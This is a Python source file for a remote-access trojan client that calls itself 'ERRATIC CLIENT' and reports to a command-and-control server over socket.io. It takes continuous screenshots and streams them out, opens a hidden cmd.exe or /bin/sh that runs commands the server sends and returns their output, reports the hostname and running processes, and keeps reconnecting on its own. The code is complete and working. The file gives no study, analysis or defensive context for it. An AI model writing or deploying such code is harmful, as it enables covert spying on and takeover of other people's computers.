import os
import socket
import socketio
import subprocess
import time
import platform
import mss
import base64
from PIL import Image
import io
import threading
import sys
import json
import ctypes

# --- Configuration ---
C2_ADDRESS = "http://127.0.0.1:8004"
RETRY_INTERVAL = 30
TARGET_HEIGHT = 720

# --- Intervals ---
DEFAULT_SCREENSHOT_INTERVAL = 1.0
SCREENSHOT_INTERVAL = DEFAULT_SCREENSHOT_INTERVAL

# --- Persistence Configuration ---
SCHEDULED_RECONNECT_SECONDS = 15 * 60
HEARTBEAT_INTERVAL_SECONDS = 5

# --- Shell State ---
shell_process = None

def get_hostname_local():
    return socket.gethostname()

# --- Core Support ---
event_logs = []
def log_event(message):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}"
    event_logs.append(log_entry)
    print(log_entry)
    send_system_output(log_entry + "\n")

sio = socketio.Client(logger=False, engineio_logger=False)
connection_start_time = 0

def send_command_output(output):
    if sio.connected:
        sio.emit('command_output', {'output': output}, namespace="/api")

def send_system_output(output):
    if sio.connected:
        sio.emit('system_output', {'output': output}, namespace="/api")

def send_screenshot(image_data):
    if sio.connected:
        sio.emit('screenshot', image_data, namespace="/api")

def take_screenshots():
    global SCREENSHOT_INTERVAL
    with mss.mss() as sct:
        while True:
            if not sio.connected:
                time.sleep(1)
                continue
            try:
                sct_img = sct.grab(sct.monitors[1])
                img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                new_h = TARGET_HEIGHT
                new_w = int(new_h * (img.width / img.height))
                resized_img = img.resize((new_w, new_h), Image.LANCZOS)
                buffered = io.BytesIO()
                resized_img.save(buffered, format="JPEG", quality=75)
                img_str = base64.b64encode(buffered.getvalue()).decode('utf-8')
                send_screenshot(img_str)
                time.sleep(max(0.01, SCREENSHOT_INTERVAL))
            except Exception as e:
                log_event(f"ERROR: Screenshot failed: {e}")
                time.sleep(SCREENSHOT_INTERVAL)

def start_heartbeat():
    while True:
        time.sleep(HEARTBEAT_INTERVAL_SECONDS)
        if sio.connected:
            try: sio.emit('client_ping', namespace="/api")
            except: pass

def start_shell():
    global shell_process
    if shell_process and shell_process.poll() is None:
        return
    
    log_event("DEBUG: Spawning unbuffered binary shell...")
    executable = "cmd.exe" if platform.system() == "Windows" else "/bin/sh"
    try:
        shell_process = subprocess.Popen(
            executable,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            shell=False,
            bufsize=0,
            text=False,
            creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
        )
        
        def stream_output():
            log_event(f"DEBUG: Binary streamer started (Shell PID: {shell_process.id if hasattr(shell_process, 'id') else shell_process.pid}).")
            last_emit = time.time()
            buffer = b""
            while True:
                if not shell_process or shell_process.poll() is not None:
                    break
                try:
                    if platform.system() == "Windows":
                        import msvcrt
                        from ctypes import wintypes
                        handle = msvcrt.get_osfhandle(shell_process.stdout.fileno())
                        avail = wintypes.DWORD()
                        if not ctypes.windll.kernel32.PeekNamedPipe(handle, None, 0, None, ctypes.byref(avail), None):
                            break
                        if avail.value > 0:
                            data = shell_process.stdout.read(avail.value)
                            if data: buffer += data
                    else:
                        data = shell_process.stdout.read(1)
                        if not data: break
                        buffer += data
                    
                    now = time.time()
                    if buffer and (len(buffer) > 2048 or (now - last_emit > 0.03) or b"\n" in buffer):
                        send_command_output(buffer.decode(errors='ignore'))
                        buffer = b""
                        last_emit = now
                    
                    if not buffer:
                        time.sleep(0.01)
                except:
                    break
            if buffer:
                send_command_output(buffer.decode(errors='ignore'))
            log_event("DEBUG: Streamer thread exiting.")

        threading.Thread(target=stream_output, daemon=True).start()
    except Exception as e:
        log_event(f"CRITICAL: Failed to start shell: {e}")

@sio.on('connect', namespace="/api")
def on_connect():
    global connection_start_time
    connection_start_time = time.time()
    log_event("DEBUG: Connected to C2.")
    sio.emit('client_info', {'hostname': get_hostname_local()}, namespace="/api")
    start_shell()

@sio.on('disconnect', namespace="/api")
def on_disconnect():
    global connection_start_time
    connection_start_time = 0
    log_event("WARNING: Disconnected from C2.")

def handle_ps():
    try:
        # Tasklist format: CSV, No Header
        res = subprocess.run(["tasklist", "/FO", "CSV", "/NH"], capture_output=True, text=True)
        if res.returncode == 0:
            lines = res.stdout.strip().split('\n')
            processes = []
            for line in lines:
                # CSV format: "Image Name","PID","Session Name","Session#","Mem Usage"
                parts = line.split('","')
                if len(parts) >= 5:
                    processes.append({
                        "name": parts[0].replace('"', ''),
                        "pid": parts[1].replace('"', ''),
                        "mem": parts[4].replace('"', '')
                    })
            sio.emit('process_list', {'processes': processes}, namespace="/api")
        else:
            log_event(f"ERROR: tasklist failed: {res.stderr}")
    except Exception as e:
        log_event(f"ERROR: PS failed: {e}")

def handle_internal_command(command_str):
    global SCREENSHOT_INTERVAL, shell_process
    parts = command_str.split()
    if not parts: return
    cmd = parts[0].lower()
    
    if cmd == "#scrsht":
        if len(parts) > 1:
            try:
                ms = float(parts[1])
                SCREENSHOT_INTERVAL = ms / 1000.0
                log_event(f"SYSTEM: Interval set to {ms}ms")
            except:
                log_event("ERROR: Invalid interval")
    elif cmd == "#logs":
        log_event("SYSTEM: Logs are active.")
    elif cmd == "#ps":
        handle_ps()
    elif cmd == "#reset":
        log_event("SYSTEM: Force resetting shell process...")
        if shell_process:
            try:
                shell_process.terminate()
                time.sleep(0.3)
                if shell_process.poll() is None: shell_process.kill()
            except: pass
        start_shell()
    elif cmd == "#sigint":
        if shell_process and shell_process.poll() is None:
            pid = shell_process.pid
            log_event(f"SYSTEM: Interrupting process tree for shell PID {pid}...")
            try:
                # Send raw Ctrl+C to stdin first
                shell_process.stdin.write(b'\x03')
                shell_process.stdin.flush()
                
                # Externally kill children
                if platform.system() == "Windows":
                    # Use powershell to find and kill all children of the shell
                    kill_cmd = f"powershell -Command \"Get-CimInstance Win32_Process | Where-Object {{ $_.ParentProcessId -eq {pid} }} | ForEach-Object {{ Stop-Process -Id $_.ProcessId -Force }}\""
                    subprocess.run(kill_cmd, shell=True, capture_output=True)
                else:
                    subprocess.run(f"pkill -P {pid}", shell=True, capture_output=True)
                
                log_event("SUCCESS: Interrupt signal dispatched.")
            except Exception as e:
                log_event(f"ERROR: Interrupt failed: {e}")

@sio.on('system_command', namespace="/api")
def handle_system_command(command_str):
    handle_internal_command(command_str.strip())

@sio.on('execute_command', namespace="/api")
def handle_command(command_str):
    global shell_process
    line_end = "\r\n" if platform.system() == "Windows" else "\n"
    if not shell_process or shell_process.poll() is not None:
        start_shell()
    if shell_process and shell_process.stdin:
        try:
            shell_process.stdin.write((command_str + line_end).encode())
            shell_process.stdin.flush()
        except Exception as e:
            log_event(f"ERROR: Shell write error: {e}")

@sio.on('stdin', namespace="/api")
def handle_stdin(data):
    global shell_process
    cmd = data if isinstance(data, str) else data.get('command', '')
    if shell_process and shell_process.poll() is None and shell_process.stdin:
        try:
            shell_process.stdin.write(cmd.encode())
            shell_process.stdin.flush()
        except Exception as e:
            log_event(f"ERROR: Stdin write error: {e}")

def attempt_connection():
    while True:
        try:
            if not sio.connected:
                sio.connect(C2_ADDRESS, namespaces=['/api'])
            return
        except:
            time.sleep(RETRY_INTERVAL)

if __name__ == '__main__':
    log_event("--- ERRATIC CLIENT ACTIVE ---")
    threading.Thread(target=take_screenshots, daemon=True).start()
    threading.Thread(target=start_heartbeat, daemon=True).start()
    while True:
        try:
            if not sio.connected:
                attempt_connection()
            while sio.connected:
                if time.time() - connection_start_time > SCHEDULED_RECONNECT_SECONDS:
                    sio.disconnect()
                    break
                time.sleep(5)
            time.sleep(5)
        except KeyboardInterrupt:
            break
        except Exception as e:
            log_event(f"CRITICAL: Main loop exception: {e}")
            if sio and sio.connected: sio.disconnect()
            time.sleep(RETRY_INTERVAL)
